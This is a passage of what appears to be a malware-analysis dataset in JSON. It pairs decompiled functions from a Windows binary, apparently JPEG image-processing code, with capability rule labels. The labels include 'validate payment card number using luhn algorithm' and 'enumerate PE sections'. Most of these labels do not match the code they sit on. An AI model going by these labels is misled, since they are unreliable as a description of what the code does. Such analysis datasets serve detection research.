        "decompiled_code": "\nuint * __cdecl fcn.0043ee30(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *in_EAX;\n    uint in_ECX;\n    uint in_EDX;\n    \n    *in_EAX = 1;\n    in_EAX[1] = in_EDX;\n    in_EAX[5] = in_ECX;\n    in_EAX[6] = arg_10h;\n    in_EAX[7] = arg_ch;\n    in_EAX[8] = arg_8h;\n    return in_EAX + 9;\n}\n",
        "token_count": 129
    },
    "0043ee58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ee58(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *in_EAX;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < in_EDX) {\n        do {\n            *in_EAX = 1;\n            in_EAX[1] = iVar1;\n            in_EAX[5] = in_ECX;\n            in_EAX[6] = arg_10h;\n            iVar1 = iVar1 + 1;\n            in_EAX[7] = arg_ch;\n            in_EAX[8] = arg_8h;\n            in_EAX = in_EAX + 9;\n        } while (iVar1 < in_EDX);\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "0043ee94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0043ee94(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar2;\n    \n    if (in_EDX < 5) {\n        *in_EAX = in_EDX;\n        iVar2 = 0;\n        piVar1 = in_EAX + 1;\n        if (0 < in_EDX) {\n            do {\n                *piVar1 = iVar2;\n                iVar2 = iVar2 + 1;\n                piVar1 = piVar1 + 1;\n            } while (iVar2 < in_EDX);\n        }\n        in_EAX[6] = 0;\n        in_EAX[5] = 0;\n        in_EAX[7] = in_ECX;\n        in_EAX[8] = arg_8h;\n        piVar1 = in_EAX + 9;\n    }\n    else {\n        piVar1 = fcn.0043ee58(arg_8h, in_ECX, 0);\n    }\n    return piVar1;\n}\n",
        "token_count": 259
    },
    "0043f2d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f2d8(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    in_EAX[1] = 0;\n    if (param_2 != 0x3e) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0xc;\n        *(iVar2 + 0x18) = 0x3e;\n        *(iVar2 + 0x1c) = param_2;\n        (***in_EAX)();\n    }\n    if (param_1 != 0x174) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0x15;\n        *(iVar2 + 0x18) = 0x174;\n        *(iVar2 + 0x1c) = param_1;\n        (***in_EAX)();\n    }\n    iVar2 = *in_EAX;\n    iVar1 = in_EAX[3];\n    fcn.004318ac(in_EAX, 0, 0x174);\n    *in_EAX = iVar2;\n    in_EAX[3] = iVar1;\n    in_EAX[4] = 0;\n    fcn.00433db0();\n    in_EAX[2] = 0;\n    in_EAX[6] = 0;\n    piVar3 = in_EAX + 0x11;\n    in_EAX[0x10] = 0;\n    iVar2 = 0;\n    do {\n        iVar2 = iVar2 + 1;\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 < 4);\n    iVar2 = 0;\n    piVar3 = in_EAX + 0x15;\n    do {\n        iVar2 = iVar2 + 1;\n        *piVar3 = 0;\n        piVar3[4] = 0;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 < 4);\n    in_EAX[0x5b] = 0;\n    in_EAX[0xb] = 0;\n    in_EAX[0xc] = 0x3ff00000;\n    in_EAX[5] = 100;\n    return;\n}\n",
        "token_count": 543
    },
    "0043f3b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f3b0(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    piVar1 = in_EAX + 0x44;\n    do {\n        if (*piVar1 != 0) {\n            *(*piVar1 + 0x80) = param_2;\n        }\n        iVar2 = iVar2 + 1;\n        piVar1 = piVar1 + 1;\n    } while (iVar2 < 4);\n    iVar2 = 0;\n    piVar1 = in_EAX + 0x54;\n    do {\n        if (*piVar1 != 0) {\n            *(*piVar1 + 0x114) = param_2;\n        }\n        if (piVar1[4] != 0) {\n            *(piVar1[4] + 0x114) = param_2;\n        }\n        iVar2 = iVar2 + 1;\n        piVar1 = piVar1 + 1;\n    } while (iVar2 < 4);\n    return;\n}\n",
        "token_count": 258
    },
    "0043f904": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0043f904(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    fcn.0043f6c8();\n    fcn.0043f6e8();\n    if ((0xffff < in_EAX[8]) || (0xffff < in_EAX[7])) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x29;\n        *(iVar1 + 0x18) = 0xffff;\n        (***in_EAX)();\n    }\n    fcn.0043f698();\n    fcn.0043f6e8();\n    fcn.0043f6e8();\n    fcn.0043f698();\n    for (iVar1 = 0; iVar1 < in_EAX[0xe]; iVar1 = iVar1 + 1) {\n        fcn.0043f698();\n        fcn.0043f698();\n        fcn.0043f698();\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "0044046c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044046c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    \n    if (in_EAX[0x2a] == 0) {\n        if (4 < in_EAX[0xe]) {\n            iVar1 = *in_EAX;\n            *(iVar1 + 0x14) = 0x1a;\n            *(iVar1 + 0x18) = in_EAX[0xe];\n            *(iVar1 + 0x1c) = 4;\n            (***in_EAX)();\n        }\n        in_EAX[0x3c] = in_EAX[0xe];\n        piVar4 = in_EAX + 0x3d;\n        for (iVar1 = 0; iVar1 < in_EAX[0xe]; iVar1 = iVar1 + 1) {\n            *piVar4 = iVar1 * 0x54 + in_EAX[0x10];\n            piVar4 = piVar4 + 1;\n        }\n        in_EAX[0x4e] = 0;\n        in_EAX[0x4f] = 0x3f;\n        in_EAX[0x50] = 0;\n        in_EAX[0x51] = 0;\n    }\n    else {\n        piVar4 = in_EAX + 0x3d;\n        piVar2 = *(in_EAX[0x52] + 0x20) * 0x24 + in_EAX[0x2a];\n        in_EAX[0x3c] = *piVar2;\n        piVar3 = piVar2;\n        for (iVar1 = 0; piVar3 = piVar3 + 1,  iVar1 < *piVar2; iVar1 = iVar1 + 1) {\n            *piVar4 = *piVar3 * 0x54 + in_EAX[0x10];\n            piVar4 = piVar4 + 1;\n        }\n        in_EAX[0x4e] = piVar2[5];\n        in_EAX[0x4f] = piVar2[6];\n        in_EAX[0x50] = piVar2[7];\n        in_EAX[0x51] = piVar2[8];\n    }\n    return;\n}\n",
        "token_count": 538
    },
    "00440ec8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00440ec8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_EAX;\n    uint *arg_ch;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t iStack32;\n    uint *puStack24;\n    uint *puStack20;\n    \n    iVar4 = *(in_EAX + 0x150);\n    iVar2 = *(in_EAX + 0xe8);\n    puStack24 = (***(in_EAX + 4))();\n    puStack20 = iVar4 + 8;\n    for (iStack32 = 0; iStack32 < *(in_EAX + 0x38); iStack32 = iStack32 + 1) {\n        arg_ch = (**(*(in_EAX + 4) + 8))(iVar2 * 3);\n        fcn.004318c0(puStack24 + iVar2, arg_ch, iVar2 * 0xc);\n        iVar4 = 0;\n        puVar5 = arg_ch;\n        puVar6 = puStack24;\n        if (0 < iVar2) {\n            do {\n                *puVar6 = arg_ch[iVar4 + iVar2 * 2];\n                iVar1 = iVar4 + iVar2 * 4;\n                iVar4 = iVar4 + 1;\n                puVar6 = puVar6 + 1;\n                uVar3 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puStack24[iVar1] = uVar3;\n            } while (iVar4 < iVar2);\n        }\n        *puStack20 = puStack24 + iVar2;\n        puStack24 = puStack24 + iVar2 * 5;\n        puStack20 = puStack20 + 1;\n    }\n    return;\n}\n",
        "token_count": 409
    },
    "0044192c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044192c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    uint8_t *puVar3;\n    int32_t *in_ECX;\n    uint32_t uVar4;\n    uint8_t **in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *var_20h;\n    uchar *var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint8_t **var_4h;\n    \n    iVar1 = *(*(in_EAX + 0x15c) + 8);\n    uVar2 = *(in_EAX + 0x1c);\n    var_4h = in_EDX;\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        if (arg_8h < 0) break;\n        puVar3 = *var_4h;\n        var_4h = var_4h + 1;\n        var_18h = *(*in_ECX + arg_ch * 4);\n        var_1ch = *(in_ECX[1] + arg_ch * 4);\n        var_20h = *(in_ECX[2] + arg_ch * 4);\n        arg_ch = arg_ch + 1;\n        var_10h = 0;\n        if (uVar2 != 0) {\n            do {\n                uVar5 = puVar3[2];\n                uVar4 = puVar3[1];\n                uVar6 = *puVar3;\n                puVar3 = puVar3 + 3;\n                *var_18h = *(iVar1 + uVar5 * 4) + *(iVar1 + 0x400 + uVar4 * 4) + *(iVar1 + 0x800 + uVar6 * 4) >> 0x10;\n                *var_1ch = *(iVar1 + 0xc00 + uVar5 * 4) + *(iVar1 + 0x1000 + uVar4 * 4) + *(iVar1 + 0x1400 + uVar6 * 4)\n                           >> 0x10;\n                *var_20h = *(iVar1 + 0x1400 + uVar5 * 4) + *(iVar1 + 0x1800 + uVar4 * 4) + *(iVar1 + 0x1c00 + uVar6 * 4)\n                           >> 0x10;\n                var_10h = var_10h + 1;\n                var_20h = var_20h + 1;\n                var_1ch = var_1ch + 1;\n                var_18h = var_18h + 1;\n            } while (var_10h < uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 670
    },
    "00441a34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00441a34(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t in_EAX;\n    uint8_t *puVar6;\n    int32_t *in_ECX;\n    uchar *puVar7;\n    uint8_t **in_EDX;\n    uint32_t uVar8;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint8_t **var_4h;\n    \n    iVar4 = *(*(in_EAX + 0x15c) + 8);\n    uVar5 = *(in_EAX + 0x1c);\n    var_4h = in_EDX;\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        if (arg_8h < 0) break;\n        puVar6 = *var_4h;\n        var_4h = var_4h + 1;\n        puVar7 = *(*in_ECX + arg_ch * 4);\n        arg_ch = arg_ch + 1;\n        uVar8 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar8 = uVar8 + 1;\n                puVar1 = puVar6 + 2;\n                puVar2 = puVar6 + 1;\n                uVar3 = *puVar6;\n                puVar6 = puVar6 + 3;\n                *puVar7 = *(iVar4 + *puVar1 * 4) + *(iVar4 + 0x400 + *puVar2 * 4) + *(iVar4 + 0x800 + uVar3 * 4) >> 0x10\n                ;\n                puVar7 = puVar7 + 1;\n            } while (uVar8 < uVar5);\n        }\n    }\n    return;\n}\n",
        "token_count": 464
    },
    "00441ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00441ac0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_EAX;\n    uint8_t *puVar4;\n    int32_t *in_ECX;\n    int32_t iVar5;\n    uint8_t **in_EDX;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar *var_28h;\n    uchar *var_24h;\n    uchar *var_20h;\n    uint8_t *var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint8_t **var_4h;\n    \n    iVar2 = *(*(in_EAX + 0x15c) + 8);\n    uVar3 = *(in_EAX + 0x1c);\n    var_4h = in_EDX;\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        if (arg_8h < 0) break;\n        puVar4 = *var_4h;\n        var_4h = var_4h + 1;\n        var_20h = *(*in_ECX + arg_ch * 4);\n        var_24h = *(in_ECX[1] + arg_ch * 4);\n        var_28h = *(in_ECX[2] + arg_ch * 4);\n        var_1ch = *(in_ECX[3] + arg_ch * 4);\n        arg_ch = arg_ch + 1;\n        var_14h = 0;\n        if (uVar3 != 0) {\n            do {\n                iVar6 = 0xff - *puVar4;\n                iVar5 = 0xff - puVar4[1];\n                iVar7 = 0xff - puVar4[2];\n                puVar1 = puVar4 + 3;\n                puVar4 = puVar4 + 4;\n                *var_1ch = *puVar1;\n                *var_20h = *(iVar2 + iVar6 * 4) + *(iVar2 + 0x400 + iVar5 * 4) + *(iVar2 + 0x800 + iVar7 * 4) >> 0x10;\n                *var_24h = *(iVar2 + 0xc00 + iVar6 * 4) + *(iVar2 + 0x1000 + iVar5 * 4) + *(iVar2 + 0x1400 + iVar7 * 4)\n                           >> 0x10;\n                *var_28h = *(iVar2 + 0x1400 + iVar6 * 4) + *(iVar2 + 0x1800 + iVar5 * 4) + *(iVar2 + 0x1c00 + iVar7 * 4)\n                           >> 0x10;\n                var_14h = var_14h + 1;\n                var_28h = var_28h + 1;\n                var_24h = var_24h + 1;\n                var_20h = var_20h + 1;\n                var_1ch = var_1ch + 1;\n            } while (var_14h < uVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 751
    },
    "00441c04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00441c04(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uchar *puVar3;\n    int32_t *in_ECX;\n    uint *in_EDX;\n    uchar *puVar4;\n    uint32_t uVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(in_EAX + 0x1c);\n    iVar2 = *(in_EAX + 0x24);\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        if (arg_8h < 0) break;\n        puVar4 = *in_EDX;\n        in_EDX = in_EDX + 1;\n        puVar3 = *(*in_ECX + arg_ch * 4);\n        uVar5 = 0;\n        arg_ch = arg_ch + 1;\n        if (uVar1 != 0) {\n            do {\n                uVar5 = uVar5 + 1;\n                *puVar3 = *puVar4;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + iVar2;\n            } while (uVar5 < uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "00441c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00441c50(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    uchar *puVar3;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = *(in_EAX + 0x38);\n    uVar2 = *(in_EAX + 0x1c);\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        if (arg_8h < 0) break;\n        var_4h = 0;\n        var_10h = in_ECX;\n        if (0 < iVar1) {\n            do {\n                uVar5 = 0;\n                iVar4 = *in_EDX;\n                puVar3 = *(*var_10h + arg_ch * 4);\n                if (uVar2 != 0) {\n                    do {\n                        uVar5 = uVar5 + 1;\n                        *puVar3 = *(iVar4 + var_4h);\n                        puVar3 = puVar3 + 1;\n                        iVar4 = iVar4 + iVar1;\n                    } while (uVar5 < uVar2);\n                }\n                var_4h = var_4h + 1;\n                var_10h = var_10h + 1;\n            } while (var_4h < iVar1);\n        }\n        in_EDX = in_EDX + 1;\n        arg_ch = arg_ch + 1;\n    }\n    return;\n}\n",
        "token_count": 396
    },
    "00441f68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00441f68(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    code **var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_18h = *(in_EAX + 0x160) + 0xc;\n    iVar1 = *(in_EAX + 0x40);\n    var_14h = arg_ch;\n    for (; var_ch < *(in_EAX + 0x38); var_ch = var_ch + 1) {\n        (**var_18h)(*var_14h + arg_8h * *(iVar1 + 0xc) * 4);\n        var_14h = var_14h + 1;\n        var_18h = var_18h + 1;\n        iVar1 = iVar1 + 0x54;\n    }\n    return;\n}\n",
        "token_count": 241
    },
    "00441fec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00441fec(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    int32_t in_EDX;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *var_34h;\n    uchar *var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar6 = *(in_EDX + 0x1c) * 8;\n    iVar1 = *(in_EAX + 0xe4) / *(in_EDX + 8);\n    iVar2 = *(in_EAX + 0xe8) / *(in_EDX + 0xc);\n    uVar3 = iVar1 * iVar2;\n    iVar7 = uVar3 >> 1;\n    if (iVar7 < 0) {\n        iVar7 = iVar7 + ((uVar3 & 1) != 0);\n    }\n    fcn.00441f18(uVar6 * iVar1);\n    var_ch = 0;\n    var_34h = arg_8h;\n    for (var_10h = 0; var_10h < *(in_EDX + 0xc); var_10h = var_10h + 1) {\n        var_30h = *var_34h;\n        var_24h = 0;\n        var_28h = 0;\n        if (uVar6 != 0) {\n            do {\n                iVar5 = 0;\n                iVar9 = 0;\n                if (0 < iVar2) {\n                    do {\n                        iVar8 = 0;\n                        puVar4 = *(in_ECX + (var_ch + iVar9) * 4) + var_28h;\n                        if (0 < iVar1) {\n                            do {\n                                iVar5 = iVar5 + *puVar4;\n                                puVar4 = puVar4 + 1;\n                                iVar8 = iVar8 + 1;\n                            } while (iVar8 < iVar1);\n                        }\n                        iVar9 = iVar9 + 1;\n                    } while (iVar9 < iVar2);\n                }\n                *var_30h = (iVar7 + iVar5) / uVar3;\n                var_30h = var_30h + 1;\n                var_24h = var_24h + 1;\n                var_28h = var_28h + iVar1;\n            } while (var_24h < uVar6);\n        }\n        var_ch = var_ch + iVar2;\n        var_34h = var_34h + 1;\n    }\n    return;\n}\n",
        "token_count": 691
    },
    "00442148": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442148(int32_t *arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint8_t **in_ECX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t in_EDX;\n    uchar *puVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint8_t **var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar4 = *(in_EDX + 0x1c) * 8;\n    fcn.00441f18(*(in_EDX + 0x1c) << 4);\n    var_10h = arg_8h;\n    var_14h = in_ECX;\n    for (var_8h = 0; var_8h < *(in_EDX + 0xc); var_8h = var_8h + 1) {\n        uVar8 = 0;\n        puVar6 = *var_10h;\n        puVar3 = *var_14h;\n        uVar5 = 0;\n        if (uVar4 != 0) {\n            do {\n                puVar1 = puVar3 + 1;\n                uVar8 = uVar8 + 1;\n                uVar2 = *puVar3;\n                puVar3 = puVar3 + 2;\n                iVar7 = uVar2 + *puVar1 + uVar5;\n                uVar5 = uVar5 ^ 1;\n                *puVar6 = iVar7 >> 1;\n                puVar6 = puVar6 + 1;\n            } while (uVar8 < uVar4);\n        }\n        var_14h = var_14h + 1;\n        var_10h = var_10h + 1;\n    }\n    return;\n}\n",
        "token_count": 445
    },
    "004421dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004421dc(int32_t *arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    uint8_t **in_ECX;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t in_EDX;\n    uint8_t *puVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint8_t **var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar6 = *(in_EDX + 0x1c) * 8;\n    fcn.00441f18(*(in_EDX + 0x1c) << 4);\n    var_14h = arg_8h;\n    var_18h = in_ECX;\n    for (var_8h = 0; var_8h < *(in_EDX + 0xc); var_8h = var_8h + 1) {\n        uVar10 = 1;\n        puVar7 = *var_14h;\n        puVar5 = *var_18h;\n        puVar8 = var_18h[1];\n        var_ch = 0;\n        if (uVar6 != 0) {\n            do {\n                puVar1 = puVar5 + 1;\n                uVar3 = *puVar5;\n                puVar5 = puVar5 + 2;\n                uVar4 = *puVar8;\n                puVar2 = puVar8 + 1;\n                puVar8 = puVar8 + 2;\n                iVar9 = uVar3 + *puVar1 + uVar4 + *puVar2 + uVar10;\n                uVar10 = uVar10 ^ 3;\n                *puVar7 = iVar9 >> 2;\n                puVar7 = puVar7 + 1;\n                var_ch = var_ch + 1;\n            } while (var_ch < uVar6);\n        }\n        var_18h = var_18h + 2;\n        var_14h = var_14h + 1;\n    }\n    return;\n}\n",
        "token_count": 523
    },
    "00442cd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00442cd8(void)\n\n{\n    int32_t *in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = (**in_EAX[1])();\n    in_EAX[0x59] = puVar1;\n    *puVar1 = 0x44283c;\n    if (in_EAX[0x30] == 1) {\n        puVar1[1] = fcn.004429f4;\n        puVar1[2] = 0x443828;\n    }\n    else if (in_EAX[0x30] == 2) {\n        puVar1[1] = fcn.00442b48;\n        puVar1[7] = 0x443a94;\n    }\n    else {\n        *(*in_EAX + 0x14) = 0x30;\n        (***in_EAX)();\n    }\n    iVar2 = 0;\n    puVar1 = puVar1 + 3;\n    do {\n        iVar2 = iVar2 + 1;\n        *puVar1 = 0;\n        puVar1[5] = 0;\n        puVar1 = puVar1 + 1;\n    } while (iVar2 < 4);\n    return;\n}\n",
        "token_count": 281
    },
    "004437e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004437e4(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    puVar1 = (***(in_EAX + 4))();\n    iVar3 = 0;\n    *(in_EAX + 0x168) = puVar1;\n    *puVar1 = 0x442d54;\n    puVar2 = puVar1 + 0x13;\n    do {\n        iVar3 = iVar3 + 1;\n        *puVar2 = 0;\n        puVar2[4] = 0;\n        puVar2 = puVar2 + 1;\n    } while (iVar3 < 4);\n    puVar1[0x10] = 0;\n    return;\n}\n",
        "token_count": 179
    },
    "004443dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004443dc(uint param_1, char param_2)\n\n{\n    char *pcVar1;\n    char **in_EAX;\n    int32_t iVar2;\n    char **ppcVar3;\n    \n    iVar2 = fcn.00444218();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    pcVar1 = *in_EAX;\n    *in_EAX = *in_EAX + 1;\n    *pcVar1 = -1;\n    ppcVar3 = in_EAX + 1;\n    *ppcVar3 = *ppcVar3 + -1;\n    if (*ppcVar3 == NULL) {\n        iVar2 = fcn.00444148();\n        if (iVar2 == 0) {\n            return 0;\n        }\n    }\n    pcVar1 = *in_EAX;\n    *in_EAX = *in_EAX + 1;\n    *pcVar1 = param_2 + -0x30;\n    ppcVar3 = in_EAX + 1;\n    *ppcVar3 = *ppcVar3 + -1;\n    if (*ppcVar3 == NULL) {\n        iVar2 = fcn.00444148();\n        if (iVar2 == 0) {\n            return 0;\n        }\n    }\n    ppcVar3 = in_EAX + 4;\n    for (iVar2 = 0; iVar2 < *(in_EAX[8] + 0xf0); iVar2 = iVar2 + 1) {\n        *ppcVar3 = NULL;\n        ppcVar3 = ppcVar3 + 1;\n    }\n    return 1;\n}\n",
        "token_count": 370
    },
    "00444a1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00444a1c(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x168) = puVar1;\n    *puVar1 = 0x443dc0;\n    iVar2 = 0;\n    puVar1 = puVar1 + 0xf;\n    do {\n        *puVar1 = 0;\n        puVar1[-4] = 0;\n        puVar1[8] = 0;\n        puVar1[4] = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 1;\n    } while (iVar2 < 4);\n    return;\n}\n",
        "token_count": 181
    },
    "00444aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444aa0(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + arg_8h;\n    return;\n}\n",
        "token_count": 54
    },
    "00444ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00444ad0(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar auStack28 [12];\n    \n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = auStack28;\n    *in_FS_OFFSET = uVar1;\n    return in_EAX + arg_8h;\n}\n",
        "token_count": 98
    },
    "00444b14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00444b14(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar auStack28 [12];\n    \n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = auStack28;\n    *in_FS_OFFSET = uVar1;\n    return param_2 + in_EAX;\n}\n",
        "token_count": 97
    },
    "00444b6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
